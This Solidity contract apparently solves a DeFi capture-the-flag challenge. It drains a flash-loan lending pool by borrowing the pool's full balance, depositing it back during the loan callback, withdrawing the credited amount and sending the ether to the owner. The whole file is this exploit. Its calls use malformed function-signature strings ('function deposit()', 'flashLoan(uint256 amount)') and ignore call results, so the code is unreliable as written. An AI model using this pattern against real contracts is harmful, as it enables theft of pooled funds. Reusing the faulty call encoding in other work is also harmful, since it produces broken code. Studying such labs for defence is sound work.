// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";
import "./SideEntranceLenderPool.sol";


contract Attacker is IFlashLoanEtherReceiver, Ownable {
    using Address for address payable;
    address lenderPool;
    constructor(address pool) Ownable() {
        lenderPool = pool;
        console.log(" owner is %s", owner());
    }

    function execute() external payable override {
        lenderPool.call{value: address(this).balance}(abi.encodeWithSignature("function deposit()"));
    }

    function start() public onlyOwner {
        lenderPool.call{value: 0}(abi.encodeWithSignature("flashLoan(uint256 amount)", address(lenderPool).balance));
        lenderPool.call{value: 0}(abi.encodeWithSignature("withdraw()"));
    }

    receive () external payable {
        console.log(address(this));
        console.log(address(this).balance);
        payable(owner()).sendValue(address(this).balance);
    }
}
